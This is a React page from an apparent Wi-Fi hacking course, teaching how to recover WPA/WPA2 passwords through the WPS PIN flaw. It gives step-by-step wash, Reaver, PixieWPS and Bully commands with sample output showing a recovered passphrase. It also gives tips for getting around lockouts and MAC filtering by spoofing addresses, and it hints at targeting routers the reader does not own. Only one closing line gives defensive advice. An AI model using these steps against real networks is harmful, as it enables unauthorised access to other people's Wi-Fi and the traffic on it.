import React from 'react';
import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';

const WithoutWordlist = () => {
  return (
    <div className="page-content">
      <h1>Cracking WPA/WPA2 Without a Wordlist — WPS Attacks</h1>

      <p>
        What if you don't have a wordlist? What if the password is so strong that no wordlist 
        contains it? Normally, you'd be stuck. But there's a backdoor — literally built into 
        many routers by the manufacturer: <strong>WPS (WiFi Protected Setup)</strong>.
      </p>

      <p>
        WPS was designed to make WiFi "easy" — press a button or enter an 8-digit PIN instead 
        of typing a complex password. But this convenience created a massive security hole. 
        Instead of guessing a potentially 63-character password (trillions of possibilities), 
        we only need to guess an 8-digit PIN. And thanks to a design flaw, it's even easier 
        than that.
      </p>

      <img 
        src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/WPS_logo.svg/250px-WPS_logo.svg.png" 
        alt="WiFi Protected Setup Logo" 
        style={{ maxWidth: '200px', borderRadius: 8, margin: '16px 0' }} 
      />

      {/* ============================================================ */}
      {/* SECTION: WPS Vulnerability                                    */}
      {/* ============================================================ */}
      <h2>🔓 The WPS Design Flaw</h2>

      <p>
        An 8-digit PIN should mean 10⁸ = <strong>100,000,000 combinations</strong>. At 1 attempt 
        per second, that's over 3 years. Too slow to brute-force, right? Wrong. Here's the flaw:
      </p>

      <Diagram title="Why WPS PIN is Only 11,000 Combinations">
{`
  WPS PIN Structure:
  ┌─────────────────────────────────────────────────────────┐
  │                                                         │
  │    PIN:  1  2  3  4  5  6  7  8                        │
  │          ────────  ──────  ─                            │
  │          1st half  2nd     Checksum                     │
  │                    half    (computed from               │
  │                            first 7 digits)             │
  │                                                         │
  │  THE CRITICAL FLAW:                                     │
  │  The router verifies each half SEPARATELY!              │
  │                                                         │
  │  First half: 4 digits → 10,000 combinations             │
  │  Second half: 3 digits → 1,000 combinations             │
  │  8th digit: checksum → auto-calculated                  │
  │                                                         │
  │  Total: 10,000 + 1,000 = 11,000 combinations!          │
  │  NOT 100,000,000!                                       │
  │                                                         │
  │  At ~1 attempt per second:                              │
  │  Worst case: 11,000 seconds ≈ 3 hours                  │
  │  Average: ~5,500 seconds ≈ 1.5 hours                   │
  │                                                         │
  └─────────────────────────────────────────────────────────┘
  
  Why? Because when you send the first half:
  • If wrong → Router says "Wrong" immediately
    (You now know it's wrong, try next combo for first half)
  • If right → Router asks for second half
    (You've cracked 4 digits! Only 1,000 more to go)
`}
      </Diagram>

      <InfoBox type="note">
        <strong>The math that killed WPS:</strong> Instead of 10⁸ (100 million) combinations, 
        the separate validation reduces it to 10⁴ + 10³ = 11,000 combinations. And the 8th digit 
        is just a checksum (calculated from the other 7), so there's really only 7 meaningful digits. 
        This is one of the biggest design flaws in WiFi history.
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: Check for WPS                                       */}
      {/* ============================================================ */}
      <h2>🔍 Checking if WPS is Enabled</h2>

      <Terminal lines={[
        { segments: [{ text: '# Use wash to scan for WPS-enabled networks', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo wash -i wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: 'BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID', type: 'output' }] },
        { segments: [{ text: '──────────────────────────────────────────────────────────────', type: 'output' }] },
        { segments: [{ text: 'AA:BB:CC:DD:EE:FF    6  -42  1.0  ', type: 'output' }, { text: 'No', type: 'highlight' }, { text: '   RalinkTe  HomeRouter', type: 'output' }] },
        { segments: [{ text: '11:22:33:44:55:66    1  -65  1.0  Yes  Broadcom  OtherNet', type: 'output' }] },
        { segments: [{ text: '77:88:99:AA:BB:CC   11  -70  2.0  No   Realtek   CafeWiFi', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# KEY COLUMNS:', type: 'comment' }] },
        { segments: [{ text: '# WPS: 1.0 or 2.0 = WPS is present', type: 'comment' }] },
        { segments: [{ text: '# Lck: No = NOT locked (vulnerable!) ✅', type: 'comment' }] },
        { segments: [{ text: '# Lck: Yes = Locked after too many attempts ❌', type: 'comment' }] },
      ]} />

      <InfoBox type="warning">
        <strong>WPS Locked:</strong> If "Lck" shows "Yes", the router has detected brute-force 
        attempts and temporarily locked WPS. Some routers lock for 60 seconds, others for 5 minutes, 
        and some lock permanently until router restart. If it's already locked, someone else may 
        have already tried — or the router locks proactively.
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: Reaver Attack                                        */}
      {/* ============================================================ */}
      <h2>🔨 Attack 1: Reaver — Online Brute Force</h2>

      <p>
        <strong>Reaver</strong> tries every possible WPS PIN against the router, one at a time. 
        It's an <em>online</em> attack, meaning you need to stay within range of the router 
        throughout the process (2-10 hours depending on the router).
      </p>

      <Terminal lines={[
        { segments: [{ text: '# Basic Reaver attack', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: 'Reaver v1.6.6 WiFi Protected Setup Attack Tool', type: 'output' }] },
        { segments: [{ text: 'Copyright (c) 2011, Tactical Network Solutions, Craig Heffner', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '[+] Switching wlan0mon to channel 6', type: 'output' }] },
        { segments: [{ text: '[+] Waiting for beacon from AA:BB:CC:DD:EE:FF', type: 'output' }] },
        { segments: [{ text: '[+] Received beacon from AA:BB:CC:DD:EE:FF', type: 'output' }] },
        { segments: [{ text: '[+] Trying pin "12345670"', type: 'output' }] },
        { segments: [{ text: '[+] Sending EAPOL START request', type: 'output' }] },
        { segments: [{ text: '[+] Received identity request', type: 'output' }] },
        { segments: [{ text: '[+] Sending identity response', type: 'output' }] },
        { segments: [{ text: '[+] Received M1 message', type: 'output' }] },
        { segments: [{ text: '[+] Sending M2 message', type: 'output' }] },
        { segments: [{ text: '[!] Received M2D (PIN was wrong)', type: 'output' }] },
        { segments: [{ text: '[+] Trying pin "12345671"', type: 'output' }] },
        { segments: [{ text: '[!] Received M2D (PIN was wrong)', type: 'output' }] },
        { segments: [{ text: '...', type: 'output' }] },
        { segments: [{ text: '[+] Trying pin "45329087"', type: 'output' }] },
        { segments: [{ text: '[+] Received M5 message', type: 'output' }] },
        { segments: [{ text: '[+] Sending M6 message', type: 'output' }] },
        { segments: [{ text: '[+] Received M7 message', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '[+] WPS PIN: \'45329087\'', type: 'highlight' }] },
        { segments: [{ text: '[+] WPA PSK: \'MyV3ryStr0ngP@ssw0rd!\'', type: 'highlight' }] },
        { segments: [{ text: '[+] AP SSID: \'HomeRouter\'', type: 'highlight' }] },
      ]} />

      <InfoBox type="success">
        <strong>Notice what just happened:</strong> We cracked a strong, complex password 
        (<code>MyV3ryStr0ngP@ssw0rd!</code>) that NO wordlist would contain! The WPS PIN 
        bypassed the password entirely. This is why WPS is so dangerous — even a perfect 
        password doesn't help if WPS is enabled.
      </InfoBox>

      <h3>Useful Reaver Options</h3>
      <table style={{ width: '100%', borderCollapse: 'collapse', margin: '16px 0' }}>
        <thead>
          <tr>
            <th style={{ padding: '10px', borderBottom: '2px solid var(--border-color)', textAlign: 'left' }}>Flag</th>
            <th style={{ padding: '10px', borderBottom: '2px solid var(--border-color)', textAlign: 'left' }}>Purpose</th>
            <th style={{ padding: '10px', borderBottom: '2px solid var(--border-color)', textAlign: 'left' }}>When to Use</th>
          </tr>
        </thead>
        <tbody>
          <tr><td style={{ padding: '8px' }}><code>-i wlan0mon</code></td><td style={{ padding: '8px' }}>Monitor mode interface</td><td style={{ padding: '8px' }}>Always required</td></tr>
          <tr><td style={{ padding: '8px' }}><code>-b BSSID</code></td><td style={{ padding: '8px' }}>Target AP MAC address</td><td style={{ padding: '8px' }}>Always required</td></tr>
          <tr><td style={{ padding: '8px' }}><code>-vv</code></td><td style={{ padding: '8px' }}>Very verbose output</td><td style={{ padding: '8px' }}>Always (see progress)</td></tr>
          <tr><td style={{ padding: '8px' }}><code>-K</code></td><td style={{ padding: '8px' }}>PixieWPS attack (offline)</td><td style={{ padding: '8px' }}>Try first! (seconds vs hours)</td></tr>
          <tr><td style={{ padding: '8px' }}><code>-d 2</code></td><td style={{ padding: '8px' }}>Delay between attempts (sec)</td><td style={{ padding: '8px' }}>If router locks out frequently</td></tr>
          <tr><td style={{ padding: '8px' }}><code>-c 6</code></td><td style={{ padding: '8px' }}>Lock to specific channel</td><td style={{ padding: '8px' }}>If reaver keeps switching channels</td></tr>
          <tr><td style={{ padding: '8px' }}><code>--no-nacks</code></td><td style={{ padding: '8px' }}>Don't send NACK messages</td><td style={{ padding: '8px' }}>If router behaves oddly</td></tr>
          <tr><td style={{ padding: '8px' }}><code>-N</code></td><td style={{ padding: '8px' }}>Don't send automatic NACKS</td><td style={{ padding: '8px' }}>Some routers work better with this</td></tr>
          <tr><td style={{ padding: '8px' }}><code>-S</code></td><td style={{ padding: '8px' }}>Use small DH keys</td><td style={{ padding: '8px' }}>Speeds up communication</td></tr>
        </tbody>
      </table>

      {/* ============================================================ */}
      {/* SECTION: PixieWPS                                             */}
      {/* ============================================================ */}
      <h2>⚡ Attack 2: PixieWPS — Offline & Instant</h2>

      <p>
        <strong>PixieWPS (Pixie Dust)</strong> is a far superior attack that works on many routers. 
        Instead of brute-forcing the PIN online (hours), PixieWPS exploits a <em>weak random number 
        generator</em> in the router's WPS implementation. If the router uses predictable "random" 
        numbers during the WPS exchange, PixieWPS can compute the PIN offline in <strong>seconds</strong>.
      </p>

      <Diagram title="PixieWPS vs Regular Brute Force">
{`
  Regular Reaver (Online Brute Force):
  ═══════════════════════════════════
  Try PIN 1 → Send to router → Wait → Wrong → Next PIN
  Try PIN 2 → Send to router → Wait → Wrong → Next PIN
  ...
  Try PIN 4532 → Send to router → Wait → CORRECT!
  
  Time: 2-10 HOURS (one attempt per second)
  
  
  PixieWPS (Offline Computation):
  ═══════════════════════════════
  Send ONE WPS exchange → Capture E-S1, E-S2 values
  ↓
  If router used weak randomness:
  E-S1 and E-S2 are predictable!
  ↓
  Compute PIN offline → DONE!
  
  Time: 1-30 SECONDS
`}
      </Diagram>

      <Terminal lines={[
        { segments: [{ text: '# Try PixieWPS first — it\'s much faster!', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '[+] Switching wlan0mon to channel 6', type: 'output' }] },
        { segments: [{ text: '[+] Waiting for beacon from AA:BB:CC:DD:EE:FF', type: 'output' }] },
        { segments: [{ text: '[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: HomeRouter)', type: 'output' }] },
        { segments: [{ text: '[+] Trying pin "12345670"', type: 'output' }] },
        { segments: [{ text: '[+] Running pixiewps...', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '[Pixie-Dust]', type: 'output' }] },
        { segments: [{ text: '[Pixie-Dust]  Compressed: yes', type: 'output' }] },
        { segments: [{ text: '[Pixie-Dust]  PIN FOUND: 45329087', type: 'highlight' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '[+] WPS PIN: \'45329087\'', type: 'highlight' }] },
        { segments: [{ text: '[+] WPA PSK: \'MyV3ryStr0ngP@ssw0rd!\'', type: 'highlight' }] },
        { segments: [{ text: '[+] AP SSID: \'HomeRouter\'', type: 'highlight' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Total time: ~5 seconds! 🎉', type: 'comment' }] },
      ]} />

      <InfoBox type="tip">
        <strong>Always try PixieWPS first!</strong> Add the <code>-K</code> flag to reaver. If it 
        works, you get the password in seconds. If it fails (router has a strong RNG), it will say 
        "WPS pin not found" — then fall back to regular brute force without <code>-K</code>.
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: Bully                                                */}
      {/* ============================================================ */}
      <h2>🐂 Alternative Tool: Bully</h2>

      <p>
        <strong>Bully</strong> is an alternative to Reaver that sometimes works better against 
        certain router models. If Reaver gets stuck or the router doesn't respond well to Reaver's 
        protocol, try Bully.
      </p>

      <Terminal lines={[
        { segments: [{ text: '# Install bully if not present', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo apt install bully', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Basic bully attack', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Bully with PixieWPS', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3', type: 'command' }] },
        { segments: [{ text: '# -d flag enables pixie dust attack in bully', type: 'comment' }] },
      ]} />

      {/* ============================================================ */}
      {/* SECTION: Edge Cases                                           */}
      {/* ============================================================ */}
      <h2>⚠️ Edge Cases & Troubleshooting</h2>

      <h3>Edge Case: WPS is locked ("Lck: Yes")</h3>
      <p>
        The router detected brute-force attempts and locked WPS. This is a rate-limiting defense.
      </p>
      <ul>
        <li><strong>Wait it out:</strong> Some routers unlock after 60 seconds to 5 minutes. Try again with a longer delay: <code>reaver -d 60</code> (60-second delay between attempts)</li>
        <li><strong>Change your MAC:</strong> Some routers track lockouts by MAC address. Spoof a new MAC and retry.</li>
        <li><strong>Power cycle:</strong> Some routers reset the lock on reboot (but you can't reboot someone else's router).</li>
        <li><strong>Give up on WPS:</strong> If permanently locked, fall back to the handshake + wordlist method.</li>
      </ul>

      <h3>Edge Case: wash shows no WPS networks</h3>
      <p>
        Most modern routers (post-2018) ship with WPS disabled by default. This attack only works 
        on routers with WPS enabled. If no WPS networks appear, you must use the handshake capture 
        + wordlist method instead.
      </p>

      <h3>Edge Case: Reaver gets stuck in a loop</h3>
      <Terminal lines={[
        { segments: [{ text: '# If reaver keeps retrying the same PIN or freezes:', type: 'comment' }] },
        { segments: [{ text: '# Try different flags:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5 --no-nacks -S', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Or try bully instead — it uses a different protocol implementation:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3', type: 'command' }] },
      ]} />

      <h3>Edge Case: "Failed to associate" error</h3>
      <p>
        Reaver can't connect to the router's WPS service. Causes:
      </p>
      <ul>
        <li><strong>Too far away:</strong> Get closer to the router</li>
        <li><strong>Wrong channel:</strong> Use <code>-c CHANNEL</code> to lock to the correct channel</li>
        <li><strong>MAC filtering:</strong> Try spoofing your MAC to a known associated client</li>
        <li><strong>AP is busy:</strong> Wait and retry — the AP might be handling other clients</li>
      </ul>

      <h3>Edge Case: PixieWPS says "WPS pin not found"</h3>
      <p>
        The router has a strong random number generator (RNG), so PixieWPS can't predict the 
        PIN. This is actually good router security! Fall back to regular brute force 
        (without <code>-K</code> flag), which will take 2-10 hours but still works.
      </p>

      <InfoBox type="success">
        <strong>Key Takeaways:</strong>
        <ul>
          <li>WPS has a critical design flaw: 11,000 combinations instead of 100,000,000</li>
          <li>Always check for WPS with <code>wash -i wlan0mon</code> before attempting wordlist attacks</li>
          <li>Try <strong>PixieWPS first</strong> (<code>reaver -K</code>) — seconds vs hours</li>
          <li>If PixieWPS fails, regular reaver brute force takes 2-10 hours</li>
          <li>WPS bypasses the WPA2 password entirely — even strong passwords are useless if WPS is on</li>
          <li><strong>Defense:</strong> DISABLE WPS on your router. There is no safe way to use it.</li>
        </ul>
      </InfoBox>
    </div>
  );
};

export default WithoutWordlist;
